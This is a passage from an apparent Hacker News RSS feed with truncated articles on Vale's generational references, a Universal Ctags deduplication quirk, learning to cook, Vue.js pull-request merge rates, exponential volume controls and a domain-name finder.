When a generational reference goes away, we don't need to reach into memory (unlike RC, where we have to decrement a counter).
</li>
<li>
We don't need to increment when aliasing (see previous section); we don't need to reach into memory to increment.
</li>
</ul>

</section>

      </div>
  
<div>

      <div>
        <div>
    
<div id="note11" data-noteid="11">
<p><span>11</span></p><section>
<p>
 Half of these are aliasings and half are dealiasings. Aliasing happens whenever we access a member (e.g. <span>person.name</span>) or make a new reference (e.g. <span>&amp;person</span>).
</p>

</section>
</div>
<div id="note12" data-noteid="12">
<p><span>12</span></p><section>
<p>
 Many languages are able to skip a lot of the adjustments, using static analysis. For example, Lobster can remove up to 95%. Our experiment doesn't have those optimizations; it compares naive RC to naive generational references.
</p>

</section>
</div>


        </div>
      </div>
    
</div>

    </div>
    <div>
      <div>
  
<section>
<h3 id="better-branch-prediction">
 Better Branch Prediction</h3>
<p>
For a given if-statement, CPUs will predict whether we'll go down the "then" branch or the "else" branch. This is called …</p></section></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vale.dev/blog/generational-references">https://vale.dev/blog/generational-references</a></em></p>]]>
            </description>
            <link>https://vale.dev/blog/generational-references</link>
            <guid isPermaLink="false">hacker-news-small-sites-25719356</guid>
            <pubDate>Sun, 10 Jan 2021 20:31:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Surprising Ctags Behaviour]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25719290">thread link</a>) | @tutfbhuf
<br/>
January 10, 2021 | https://joshleeb.com/posts/surprising-ctags.html | <a href="https://web.archive.org/web/*/https://joshleeb.com/posts/surprising-ctags.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><p>Published
<time datetime="2021-01-10">2021-01-10</time>
on <a href="https://joshleeb.com/">Joshleeb's blog</a></p><p>Today I came across some interesting behaviour implemented by <code>ctags</code> (specifically <a href="https://github.com/universal-ctags/ctags">Universal Ctags</a>) with the way some tag entries are handled. At first I was surprised. Then thinking about a bit more I can understand why. But still, I feel there must be a better way.</p><p>Let’s take a look at some Rust code.</p><div><pre><code data-lang="rust"><span>// lib.rs
</span><span></span><span>struct</span> <span>Foo</span>;<span>
</span><span>
</span><span></span><span>impl</span><span> </span>Debug<span> </span><span>for</span><span> </span>Foo<span> </span>{<span>
</span><span>    </span><span>fn</span> <span>fmt</span>(<span>&amp;</span><span>self</span>,<span> </span>f: <span>&amp;</span><span>mut</span><span> </span>fmt::Formatter<span>&lt;</span><span>'_</span><span>&gt;</span>)<span> </span>-&gt; <span>fmt</span>::<span>Result</span><span> </span>{<span>
</span><span>        </span>...<span>
</span><span>    </span>}<span>
</span><span></span>}<span>
</span><span>
</span><span></span><span>struct</span> <span>Bar</span>;<span>
</span><span>
</span><span></span><span>impl</span><span> </span>Debug<span> </span><span>for</span><span> </span>Bar<span> </span>{<span>
</span><span>    </span><span>fn</span> <span>fmt</span>(<span>&amp;</span><span>self</span>,<span> </span>f: <span>&amp;</span><span>mut</span><span> </span>fmt::Formatter<span>&lt;</span><span>'_</span><span>&gt;</span>)<span> </span>-&gt; <span>fmt</span>::<span>Result</span><span> </span>{<span>
</span><span>        </span>...<span>
</span><span>    </span>}<span>
</span><span></span>}<span>
</span></code></pre></div><p>Looks pretty straight forward. We have two structs <code>Foo</code> and <code>Bar</code>, both of which implement the <code>Debug</code> trait. Now let’s see what happens when we run <code>ctags</code>.</p><div><pre><code data-lang="txt">$ ctags --fields=+K lib.rs
Bar	lib.rs	/^impl Debug for Bar {$/;"	implementation
Bar	lib.rs	/^struct Bar;$/;"	struct
Foo	lib.rs	/^impl Debug for Foo {$/;"	implementation
Foo	lib.rs	/^struct Foo;$/;"	struct
fmt	lib.rs	/^    fn fmt(&amp;self, &amp;mut fmt::Formatter&lt;'_&gt;) -&gt; fmt::Result {$/;"	method	implementation:Bar
fmt	lib.rs	/^    fn fmt(&amp;self, &amp;mut fmt::Formatter&lt;'_&gt;) -&gt; fmt::Result {$/;"	method	implementation:Foo
</code></pre></div><p>All appears normal. We see our two structs, implementations, and methods appearing as expected.</p><p>The <code>--fields=+K</code> flag doesn’t do anything unexpected either. It simply changes the output to emit the long symbol kind <code>struct</code> rather than the shorter <code>s</code>.</p><p>Now let’s extend <code>lib.rs</code> with some more code.</p><div><pre><code data-lang="rust"><span>impl</span><span> </span>Display<span> </span><span>for</span><span> </span>Bar<span> </span>{<span>
</span><span>    </span><span>fn</span> <span>fmt</span>(<span>&amp;</span><span>self</span>,<span> </span>f: <span>&amp;</span><span>mut</span><span> </span>fmt::Formatter<span>&lt;</span><span>'_</span><span>&gt;</span>)<span> </span>-&gt; <span>fmt</span>::<span>Result</span><span> </span>{<span>
</span><span>        </span>...<span>
</span><span>    </span>}<span>
</span><span></span>}<span>
</span></code></pre></div><p>What do you expect to see in the output from <code>ctags</code>? I can tell you that I was expecting to see an additional implementation and an additional method reflected in the generated tags.</p><div><pre><code data-lang="txt">$ ctags --fields=+K lib.rs
Bar	lib.rs	/^impl Debug for Bar {$/;"	implementation
Bar	lib.rs	/^impl Display for Bar {$/;"	implementation
Bar	lib.rs	/^struct Bar;$/;"	struct
Foo	lib.rs	/^impl Debug for Foo {$/;"	implementation
Foo	lib.rs	/^struct Foo;$/;"	struct
fmt	lib.rs	/^    fn fmt(&amp;self, &amp;mut fmt::Formatter&lt;'_&gt;) -&gt; fmt::Result {$/;"	method	implementation:Bar
fmt	lib.rs	/^    fn fmt(&amp;self, &amp;mut fmt::Formatter&lt;'_&gt;) -&gt; fmt::Result {$/;"	method	implementation:Foo
</code></pre></div><p>There we see the three implementations, but only two <code>fmt</code> methods.</p><p>When I saw this, my first thought was to try and figure out which of the two <code>fmt</code> methods implemented for <code>Bar</code> were being picked up, and which one was being skipped by <code>ctags</code>. To do this, we can set the <code>--fields</code> flag to include line numbers.</p><div><pre><code data-lang="txt">$ ctags --fields=+Kn lib.rs
Bar	lib.rs	/^impl Debug for Bar {$/;"	implementation	line:11
Bar	lib.rs	/^impl Display for Bar {$/;"	implementation	line:17
Bar	lib.rs	/^struct Bar;$/;"	struct	line:9
Foo	lib.rs	/^impl Debug for Foo {$/;"	implementation	line:3
Foo	lib.rs	/^struct Foo;$/;"	struct	line:1
fmt	lib.rs	/^    fn fmt(&amp;self, &amp;mut fmt::Formatter&lt;'_&gt;) -&gt; fmt::Result {$/;"	method	line:12	implementation:Bar
fmt	lib.rs	/^    fn fmt(&amp;self, &amp;mut fmt::Formatter&lt;'_&gt;) -&gt; fmt::Result {$/;"	method	line:18	implementation:Bar
fmt	lib.rs	/^    fn fmt(&amp;self, &amp;mut fmt::Formatter&lt;'_&gt;) -&gt; fmt::Result {$/;"	method	line:4	implementation:Foo
</code></pre></div><p>Alright, so now we are getting all three implementations, and all three <code>fmt</code> methods.</p><p>Looking at the two <code>method</code> lines for <code>implementation:Bar</code> we can see the only difference is the line number. So it appears that <code>ctags</code> will deduplicate tag entries that will appear the same when output, even if each tag entry refers to a distinct symbol.</p><p>Checking the <a href="https://linux.die.net/man/1/ctags">man page</a>, I didn’t find this behaviour documented. But there was something useful for the <code>--excmd</code> flag. Here we see that running <code>ctags --excmd=number</code> will <em>“Use only line numbers in the tag file for locating tags.”</em> And since our second run of <code>ctags</code> included line numbers there seems to be some relevance.</p><p>Reading on we see some advantages listed for including line numbers. Namely the fourth point.</p><blockquote><p>Retains separate entries in the tag file for lines which are identical in content. In pattern mode, duplicate entries are dropped because the search patterns they generate are identical, making the duplicate entries useless.</p></blockquote><p>On the surface this seems reasonable. But consider the implications for an editor (or plugin) that reads the generated tags and allows the user to jump to a specific symbol in the codebase. The tag file may seem like a set of all symbols in the codebase, but treating it as such may skip over some symbols.</p><p>Instead, what we have is a file containing the patterns of all symbols that ctags picked up. So the editor should, for each file, iterate over each pattern ctags captures for that file, and grep for the symbols to then display to the user. And, naively, this would have to happen each time the user wanted to jump to another symbol in the codebase since files can change all the time.</p><p>Alright, so that seems like a non-obvious corner case for someone wanting to work with <code>ctags</code> to have to think about. There is also a lot of unnecessary work the editor has to do each time we want to jump to a symbol. But we know we can have <code>ctags</code> output the set of all symbols by including line numbers so let’s consider that approach.</p><p>When using line numbers, rather than patterns, jumping to a symbol becomes trivial to implement and much more efficient. We could even just fuzzy match on the tags file itself to select a particular symbol, and then jump to the file and the line included in the tag entry. But, this does have a pretty significant drawback (also referenced in the man page).</p><blockquote><p>changes to the source files can cause the line numbers recorded in the tag file to no longer correspond to the lines in the source file, causing jumps to some tags to miss the target definition by one or more lines. Basically, this option is best used when the source code to which it is applied is not subject to change.</p></blockquote><p>Clearly then, this approach isn’t great either. Unless…</p><p><code>ctags</code> itself isn’t particularly slow, but it isn’t <em>blazingly</em> fast either. And given that <a href="https://github.com/universal-ctags/ctags/issues/761">it runs entirely on a single thread</a>, and symbol indexing is an embarrassingly parallel problem, there seems to be an opportunity for a significant speed up.</p><p>So, if we index symbols by file path and line number, and are able to reindex fast enough that it becomes reasonable to do so on each file change, then we can avoid the drawbacks mentioned in the man page. Unfortunately though, this doesn’t get rid of another (very similar) drawback with indexing by line number.</p><p>An interesting benefit of indexing with patterns is that even for unsaved buffers, the editor will be able to jump to the correct location for a symbol. And only symbols added prior to saving the file won’t be picked up. But unless the file is saved, with our new approach we won’t be aware of any changes and so the line numbers are likely to get out of sync.</p><p>It seems improving on this will require some more thought. Perhaps an API akin to the <a href="https://microsoft.github.io/language-server-protocol/specifications/specification-current/#textDocument_didOpen">DidOpenTextDocument Notification</a> in the Language Server Protocol spec…</p></article></div></div>]]>
            </description>
            <link>https://joshleeb.com/posts/surprising-ctags.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25719290</guid>
            <pubDate>Sun, 10 Jan 2021 20:26:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cooking for Founders]]>
            </title>
            <description>
<![CDATA[
Score 75 | Comments 66 (<a href="https://news.ycombinator.com/item?id=25719188">thread link</a>) | @tylertringas
<br/>
January 10, 2021 | https://tylertringas.com/cooking-for-founders/ | <a href="https://web.archive.org/web/*/https://tylertringas.com/cooking-for-founders/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
									<p>With COVID-19 forcing many of us indoors and cooking more (yes, this post took a little longer to go live than I planned), there’s never been a better time to really learn how to cook. I grew up not learning much about how to cook and taught myself as an adult. Over the last 5-7 years I went from someone who could do the absolute bare minimum (boil pasta, cook chicken breast, etc) to genuinely quite a decent cook. I can easily whip up dinner for 4-6 friends without stressing, cook healthy dinners at home most nights of the week, run a barbecue for 12 people, and have a small quiver of fancy dishes to impress friends, family, and my wife from time to time. This post is mostly about what works for me, but I’m calling it Cooking For Founders because I think it will resonate with a lot of entrepreneurs who think like me.</p>
<p>The goal of this post is not to teach you how to cook but to provide fairly comprehensive, but also minimum viable, roadmap for going from a cooking noob to solid home chef.</p>
<h2>Why you should cook</h2>
<p>Until I was about 25 or so I really didn’t cook much. I lived in places like NYC and London where restaurants were always open and ubiquitous and especially in these cities, it’s a perfectly reasonable position to just not bother learning to cook well. But I want to make the case that even if you have world class restaurants and food delivery services on demand, you should learn to cook.</p>
<p><strong>Social: </strong>Home cooked meals are an awesome offer that people are very likely to take you up on and really appreciate. Cooking well is sexy and makes for an awesome date night. Dinner parties are fantastic well to meet new people and create a vibrant personal and professional network. Taking charge of a meal is a great way to bring your family together or impress your in-laws.</p>
<p><strong>Physical Health: </strong>Even if you aren’t bothering with any particular diet (low carb, paleo, etc), cooking at home is almost always going to be more nutritious than food from restaurants. Getting actually healthy food from restaurants/delivery is almost always expensive. Cooking at home is an affordable way to get great nutrition.</p>
<p><strong>Mental Health:&nbsp;</strong>This may be more specific to me, but I find cooking to be fantastic for my mental health. In my house I’m the one cooking about 90% of the time and I’m not into the mega meal prep strategies where you cook food for the whole week. So, most days, I’m cooking something fresh for dinner. The need to start cooking prep in time for a reasonable dinner puts a natural stopping point in my work day and then I get to switch to a very focused mono-tasking activity. This routine is, for me, a kind of meditation that separates the work day and let’s my brain process the events of the day.</p>
<h2>Meta-learning Tips for Learning to Cook</h2>
<p>Learning to cook is not exactly easy. There is an infinite amount of recipes, techniques, resources, diets, and on and on to consume. It can be overwhelming. Learning to cook is almost always laden with failures along the way. You’ll screw up some recipes, ruin some dishes, and get halfway through a complex recipe before realizing you’re missing some essential ingredient. Here are some lessons I’ve learned on how to learn.</p>
<p><strong>Find your YouTube &amp; TikTok muses</strong></p>
<p>There is an infinite amount of cooking content on the internet, but when you find a particular chef or channel that really speaks your language, subscribe and binge their entire backlog. Lots of channels out there will skip essential explanations, use overly exotic ingredients, or complex unnecessary techniques so when you find one that consistently speaks to you, lock it in. Some ones I like:</p>
<ul>
<li><a href="https://www.youtube.com/user/helenrennie">Helen Rennie (YouTube)</a></li>
<li><a href="https://www.youtube.com/user/foodwishes">Food Wishes (YouTube)</a></li>
<li><a href="https://www.youtube.com/user/SeriousEats">Serious Eats (YouTube)</a></li>
<li><a href="https://www.tiktok.com/@thatdudecancook?lang=en">@thatdudecancook (TikTok)</a></li>
<li><a href="https://www.tiktok.com/@sad_papi?lang=en">@sad_papi (TikTok)</a></li>
</ul>
<p><strong>Have a backup plan</strong></p>
<p>Learning to cook and feeding yourself can be two different things, especially when you are first starting out and failure rates are high. If you are going to try a new recipe for the first time on a busy week night that’s supposed to be your dinner that night (1) go for it! (2) have a frozen pizza or some other quick and easy back up plan ready in case you end up ruining the dish. It’s a really negative feedback loop to mess up a recipe and having to end up eating cereal for dinner, so have a backup plan.</p>
<p><strong>Read/watch the recipe several times well before cooking</strong></p>
<p>Read or watch your recipes <em>carefully,&nbsp;</em>several times, in preparation for trying a new recipe. It’s easy to miss, especially at first, that the recipe actually requires marinating over night, or needs buttermilk or some other ingredient you don’t typically have on hand. Don’t just plop open the recipe book at 7p and start with Step #1.</p>
<p><strong>Stick to a few core cookbooks</strong></p>
<p>Again, it’s easy to get overwhelmed by the millions of cookbooks out there. Like YouTube channels, I recommend finding a few comprehensive cookbooks that work for you and sticking to them for years until you get very confident with a wide variety of techniques. With cookbooks, Kindle will work but having the physical copy can also be really helpful (or honestly I usually get both). Here are some that I recommend:</p>
<ul>
<li><a href="https://amzn.to/3seCIbQ">How To Cook Everything, Mark Bittman</a></li>
<li><a href="https://amzn.to/3oyrCwn">Cooking For Geeks, Jeff Potter</a></li>
<li><a href="https://amzn.to/3sfvapE">Salt, Fat, Acid, Heat, Samin Nosrat</a></li>
<li><a href="https://amzn.to/38wzSre">The Four Hour Chef, Tim Ferriss</a></li>
</ul>
<h2>Essential Concepts</h2>
<p>The books and channels above all have great introductions to all of these concepts so I’m not going to try to actually cover them here, but I think it’s useful have a few simple concepts to check off as you read/watch through the first few.</p>
<p><strong>What heat does (chemistry)</strong></p>
<p>Make sure you pay attention to the sections on the basic chemistry of heat. The vast majority of cooking is just different ways applying heat to food and it’s critical to understand what heat is doing to different kinds of foods. For the most part heat is either (1) denaturing proteins or (2) producing a Maillard Reaction. Denaturing proteins is the slow gradual cooking process that turns eggs from runny to scrambled or steak from rare to well done. Different foods have different kinds of proteins which denature at different temperatures and in different ways. The Maillard Reaction is browning (mostly on on meats and vegetables) and happens at very high heat and low moisture environments. Read up on these carefully. Cooking for Geeks covers these the best in my opinion.</p>
<p><strong>Different kinds of heat transfer (physics)</strong></p>
<p>Similarly to understanding what heat does, it’s really important to have a basic grasp of the various methods of applying heat to food. Baking, broiling, roasting, sautéing, braising, searing, sous vide, boiling, and so on, are all just different methods for applying heat. Some, like baking, use convection where the air is heated up around the food, and others, like searing in a pan, use conduction where the heat is transferred directly surface to surface. A cast iron pan takes a very long time to heat up and stays hot for a long time, whereas the air in your oven can dissipate its heat quickly. Understanding these basic concepts will give you the architecture for understanding for why you should keep the oven door closed as much as possible, dry your meat before searing, and pre-heat your heavy pans for longer than your light ones.</p>
<p><strong>Keep it simple</strong></p>
<p>When you are first learning to cook I recommend avoiding complex recipes in favor of simple two or three-part meals where each component is cooked individually. The vast majority of our home-cooked meals involve cooking (a) a protein like fish or meat (b) a vegetable cooked simply, like roasted in olive oil and (c) a starch like rice, potatoes, simple pasta. This let’s you build a healthy meal with simple individual components, master the same techniques with repeat practice, and minimize the risk of blowing up the whole dish.</p>
<p><strong>Make it taste good</strong></p>
<p>This may seem obvious, but it’s important that the food you cook actually taste good. Home-cooked food is almost always healthier than restaurant food, so don’t try to learn to cook and cook the healthiest possible version of each dish. Most veggies taste better roasted in a generous amount of olive oil than they do steamed, so roast them! Baste your chicken in butter. Salt your food generously. Learning to cook by producing dishes that just aren’t that tasty is a very bad feedback loop, so do what you need to to make it taste good.</p>
<p><strong>Don’t cook everything evenly</strong></p>
<p>This is a little more specific but I feel like it needs to be specifically counter-programmed. For some dumb reason a lot people (including myself 10 years ago) got the notion that food needs to be cooked&nbsp;<em>evenly</em>. That it’s really important to constantly turn and shake and rotate your food so that it’s cooked the same all the around and through. This is a great way to make gross food. Stop touching and turning your food. Most dishes are better with a substantial amount of difference in how cooked different sides of the food are: steak with a crunchy sear and medium rare inside, roasted potatoes with a waxy crust and fluffy inside, carrots or asparagus charred on side are all much tastier and mostly produced by having uneven cooking.</p>
<p><strong>Baking is really hard</strong></p>
<p>Really. Baking is much harder and less forgiving than any other kind of cooking. If you’re just starting to get into cooking, don’t start with baking.</p>
<h2>Essential Gear</h2>
<p>Okay, obviously you can spend and absolute fortune and fill a kitchen with mountains of cooking gear. That’s part of the fun of getting into cooking, let’s be honest. But if all you’ve got is a crappy 10-piece Wal-mart cooking set you got as a wedding gift or a hodge podge you inherited from your roommates, and you need to build your kitchen from scratch, this is the minimum kit I think you need. <em>(Disclosure: most of these are Amazon affiliates links. Don’t click them if that’s a thing that will make you mad).</em></p>
<p><strong>Pots and Pans</strong></p>
<p>The essential workhorses of cooking. Different kinds of pots and pans provide really different value for money, so I’ll specifically recommend below which ones I think it makes sense to invest in something …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tylertringas.com/cooking-for-founders/">https://tylertringas.com/cooking-for-founders/</a></em></p>]]>
            </description>
            <link>https://tylertringas.com/cooking-for-founders/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25719188</guid>
            <pubDate>Sun, 10 Jan 2021 20:17:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Vuejs rejects close to 75% of outside contributions]]>
            </title>
            <description>
<![CDATA[
Score 85 | Comments 85 (<a href="https://news.ycombinator.com/item?id=25719116">thread link</a>) | @gieksosz
<br/>
January 10, 2021 | https://merge-chance.info/target?repo=vuejs/vue | <a href="https://web.archive.org/web/*/https://merge-chance.info/target?repo=vuejs/vue">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    
    
    
    <p><a></a>
        <span> of the PRs made by outsiders (not owners/members) get merged.</span>
    </p>
    
    
    <p><a></a>
        <i> * Based on most recent <strong> 272 </strong> outsiders' PRs </i>
    </p>
    <p><a></a>
        <i> * PRs open but not merged within 90 days are also treated as rejected </i>
    </p>
    
    
    <p><a></a>
        <span>
            Copy Markdown below to your README.md to get a Merge-Chance badge
        </span>
    </p>
<div>
    <pre>        <code>
            ![Custom badge](https://img.shields.io/endpoint?url=https%3A%2F%2Fmerge-chance.info%2Fbadge%3Frepo%3Dvuejs/vue)
        </code>
    </pre>
</div>
<p><a></a>
    <span> Like this one</span>
    <img alt="Custom badge" src="https://img.shields.io/endpoint?url=https%3A%2F%2Fmerge-chance.info%2Fbadge%3Frepo%3Dvuejs/vue">
</p>
<br>

<br>
<hr>




</div>]]>
            </description>
            <link>https://merge-chance.info/target?repo=vuejs/vue</link>
            <guid isPermaLink="false">hacker-news-small-sites-25719116</guid>
            <pubDate>Sun, 10 Jan 2021 20:10:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Linear Volume Controls Are Evil]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25719051">thread link</a>) | @PieUser
<br/>
January 10, 2021 | https://www.dr-lex.be/info-stuff/volumecontrols.html#about | <a href="https://web.archive.org/web/*/https://www.dr-lex.be/info-stuff/volumecontrols.html#about">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapDeco">


<div>

<h3>a.k.a. Notice to Programmers of Audio Software and Hardware</h3>

<p>
There is a single very annoying thing about lots of audio software products, due to either lack of programmers' knowledge about the human auditory system, laziness, or both. Their volume controls are a pain to work with. If you could ever be involved — even remotely — in the development of a software or hardware product involving <strong>sound,</strong> please read this text carefully, burn its core message into your memory and spread the news!
</p>
<p>
<a href="https://zhuanlan.zhihu.com/p/120433800">A Chinese translation of this page is available. <span lang="zh-Hans">还提供该网页的中文翻译。</span></a>
</p>



<h2 id="summary">To the Point</h2>

<p>
For those with little time, here is the essence of this text compressed into a few sentences:
</p>
<ul>
<li><em>Volume sliders must not be linear.</em> Linear volume sliders are a nuisance because human perception of loudness is not linear at all, it is <em>logarithmic.</em> That is why all audio equipment worth its name uses the dB scale to indicate volume and gain settings. For a relative amplitude level <var>x</var>, the dB value equals 20*log<sub>10</sub>(<var>x</var>). Positive dB values mean amplification, negative values attenuation. Multiplying amplitude by a certain factor means adding a certain amount of dB. To measure absolute loudness as perceived by humans, the dB(A) scale is often used, with 0&nbsp;dB(A) the loudness of the most silent perceivable sound. In practice, a ‘silent’ room will be at ±30&nbsp;dB(A).</li>
<li>A volume control should <em>not</em> be based on percentages, because this implies linearity. A percentage is only acceptable if it maps to dB values, e.g. 0%&nbsp;=&nbsp;-60&nbsp;dB and 100%&nbsp;=&nbsp;0&nbsp;dB.</li>
<li>The ideal volume slider follows an <strong>exponential curve</strong> <var>y</var>&nbsp;=&nbsp;<var>a</var>·exp(<var>b</var>·<var>x</var>), with its lowest setting corresponding to ‘silence’ (typically 30&nbsp;dB(A) for consumer products) and its highest setting the maximum loudness the user's audio equipment produces. The problem with this is that one can in general only make vague assumptions about what equipment the user will be using. Unless you are working on a high-end product with known specifications, you will need to make some guesses and approximations. A good assumption for consumer equipment is that the user will have a usable range of 60&nbsp;dB.</li>
<li><a href="#table1">Table 1</a> shows some practical values of parameters <var>a</var> and <var>b</var> in the formula <var>y</var>&nbsp;=&nbsp;<var>a</var>·exp(<var>b</var>·<var>x</var>) for various figures of loudness ranges; <var>x</var> is the slider's relative position in the interval [0,1] and <var>y</var> is the actual scale factor for the sound waveform. Again, you should probably use the parameters for 60&nbsp;dB range. Add a linear roll-off near zero if you want to ensure perfect silence at volume setting&nbsp;0.</li>
<li>If you want to offer a way of changing volume by discrete increments, like pushing buttons or turning a mouse scroll wheel, make sure the increments are somewhere between 1&nbsp;dB and 3&nbsp;dB. Volume changes below 1&nbsp;dB are not noticeable and changes above 3&nbsp;dB are too coarse. 2&nbsp;dB is pretty much ideal as a step size.</li>
<li>If for some reason you don't want to implement a full exponential function, you can instead rely on a good all-round and computationally cheap approximation that fits the typical 60&nbsp;dB range of low-to-medium powered consumer audio systems. This approximation is the 4th power of the volume slider's position <var>x</var> scaled to the interval [0, 1]. In other words: amplitude multiplication factor = <var>x</var><sup>4</sup>. <a href="#table1">Table 1</a> shows similar approximations for other dynamic ranges. If you cannot afford implementing a true exponential curve, use this simple formula for your volume slider. It is not perfect, but a billion times better than a linear slider!</li>
</ul>
<p>
If you want to know more, read on. Otherwise, read the above list again and make sure you'll never forget it.
</p>


<h2 id="about">Why Linear Volume Controls are Evil</h2>

<p>
Most audio software nowadays has sliders or even rotating knobs to control the volume. The intention is to mimic controls of ‘classic’ audio hardware. Unfortunately, there is one thing about a lot of software sliders which makes them a pain in the ass: they are <em>LINEAR.</em> You might ask, what could possibly be wrong with a linear slider: it is zero at the one end, 100% at the other end, and neatly linear in between, isn't that just ideal? The answer is a big <em>no.</em>
</p>
<p>
Give it a try: open your favourite audio player, start playing a song, grab the volume slider, and wobble it to and fro at the ‘loud’ end of the volume range. Next, do the same at the ‘silent’ end. Chances are you will experience the following: almost no audible volume variations at the ‘loud’ end, and extreme volume variations at the ‘silent’ end. In that case you can be pretty sure the slider is linear.
</p>
<p>
A few popular applications that I have found to suffer from this flaw, are:
</p>
<ul>
<li>QuickTime Player</li>
<li>iTunes <em>(fixed in later versions!)</em></li>
<li>Windows Media Player and the Windows volume control</li>
<li id="fnRef1">YouTube and pretty much every other Flash-based video player<sup><a href="#fn1">(1)</a></sup>.</li>
</ul>
<p>
The <em>evil</em> has even spread to hardware. Velleman sells a solderable kit of a graphic equaliser, K4302. I don't know if this has been corrected now, but when I bought the kit back in 1995 it had linear sliders while they should be logarithmic (C law if I'm correct). Even the G3 iMac's volume control was linear, and I'm afraid that this is just one of many examples.
</p>
<p>
Next to what has already been said above, using a linear volume control can lead to these symptoms:
</p>
<ul>
<li>The most silent volume setting, the first step above mute, is still too loud.</li>
<li>The perceived maximum volume level is reached around the middle of the slider, making the upper half useless.</li>
<li>When connecting earphones with a high sensitivity versus PC speakers with low output to the same computer, it is difficult or impossible to make fine volume adjustments with the earphones, while the slider needs to be hauled over great distances to cause any loudness change on the speakers.</li>
</ul>
<p>
Issues like these ultimately lead to frustrated people cursing the damn volume control, or feeling uneasy while using your product without really knowing why. Luckily there are lots of products with <em>correct</em> volume controls, but the number of flawed products is way too high.
</p>

<h2 id="wrong">What is going wrong?</h2>

<p>
Now what exactly is wrong with a linear volume slider? The answer lies within the way our ears perceive sound. The point is that our sensation of ‘loudness’ is <strong>LOGARITHMIC.</strong>
</p>
<p><img src="https://www.dr-lex.be/info-stuff/infoimages/volume_log.gif" width="344" height="246" alt="Logarithmic curve">
</p>
<p>
This means that we are much more sensitive to small variations in amplitude for silent sounds than for loud sounds. This allows us to cope with a very large dynamic range of amplitudes. It also means a linear volume slider causes a logarithmic sensation of volume variations, and that just doesn't feel right. The above figure shows a logarithmic curve. Two identical sections are marked on the horizontal axis (read: the volume slider). The vertical axis shows perceived volume changes. The corresponding section marked by the curve at the ‘silent’ end is much larger than at the ‘loud’ end.
</p>
<p id="fnRef2">
The solution to implementing a <em>real</em> volume slider is fairly simple: instead of being linear, the slider should be <strong>EXPONENTIAL.</strong> Because log(exp(<var>x</var>)) = <var>x</var>, the sensation of volume variations will be linear, and that is what we want<sup><a href="#fn2">(2)</a></sup>.
</p>
<p>
In this text I will assume that both the volume slider and the audio system work with values between zero (minimum) and one (maximum). The volume slider position is represented by <var>x</var>, the resulting multiplication factor for signed sound wave data is <var>y</var>.
</p>

<h2 id="ideal">Finding the ‘ideal’ curve</h2>

<p>
Exponential functions have two annoying properties. The first is that they only reach zero at minus infinity. This is not a problem however, because our ears do not have infinite sensitivity. We only need to know the practical dynamic range, this will be explained below.
</p>
<p>
The second is that in its most general form <var>y</var> = <var>a</var>·exp(<var>b·x</var>)+<var>c</var>, an exponential function going through two points can have various shapes. Even a linear function is a limit case of such a curve. Luckily in the case of our volume control, we can and should limit the equation to <var>y</var>&nbsp;=&nbsp;<var>a</var>·exp(<var>b·x</var>) because our ears do not have an offset. This means that two points suffice to obtain a unique solution for the constants <var>a</var> and <var>b</var>. We already know one of those points, because we want the function to have a value of 1 for <var>x</var>&nbsp;=&nbsp;1. This means that <var>a</var>&nbsp;=&nbsp;1/exp(<var>b</var>). So the problem is reduced to determining the correct value of <var>b</var>, which controls the shape of the curve. Small values produce a very ‘sharp’ curve while large values produce a more linear-like curve.
</p>
<p>
If you are still thinking linearly you might be tempted to pick (0,0) as the second point, which it is not. As I said above, our exponential volume control will inevitably still have a non-zero amplitude at the zero slider position. This is not a problem because the logarithmic response curve of our ears also hits zero below a certain non-zero input loudness, the <em>hearing threshold.</em> Moreover, in any normal environment with background noise, sounds with a loudness below the noise level will already be inaudible. The major problem is that even though the hearing threshold is roughly the same across different persons, the loudness produced by any audio system for a given signal amplitude depends on a multitude of parameters. To determine the correct value for <var>b</var>, we need more information. If we want to provide the user with a “fully linear volume control sensation,” we would need to know how ‘loud’ their audio equipment plays at its loudest setting. Obviously, this is not a practical question. There simply is no specific answer to it unless you are developing software for very specific audio hardware. We will need to make some assumptions. First a short digression about how sound ‘loudness’ is measured.
</p>

<h2 id="dB">Measuring sound levels</h2>

<p>
Because the human auditory system has a logarithmic sensitivity curve, a special unit of ‘sound loudness’ was invented and named after Graham Bell: the ‘Bel’. This unit is too large to be practical however, therefore it is almost always used with a factor 0.1, yielding the decibel, denoted with the symbol dB: 1&nbsp;Bel = 10&nbsp;dB. There are two kinds of dB scales, an absolute and a relative scale.
</p>
<p>
The <em>absolute scale</em> tries to give an indication of how loud a certain sound is …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.dr-lex.be/info-stuff/volumecontrols.html#about">https://www.dr-lex.be/info-stuff/volumecontrols.html#about</a></em></p>]]>
            </description>
            <link>https://www.dr-lex.be/info-stuff/volumecontrols.html#about</link>
            <guid isPermaLink="false">hacker-news-small-sites-25719051</guid>
            <pubDate>Sun, 10 Jan 2021 20:05:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Domain name finder to discover great domains like Firefox, TaskRabbit]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25719007">thread link</a>) | @danskeren
<br/>
January 10, 2021 | https://ask.moe/domain | <a href="https://web.archive.org/web/*/https://ask.moe/domain">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div view="domain">

<p>
Ask.Moe's domain name finder makes it easy to find great domains, like FireFox, MailChimp, TaskRabbit, etc. by combining two words, searching through hundreds of domains in seconds.
</p>
<p>
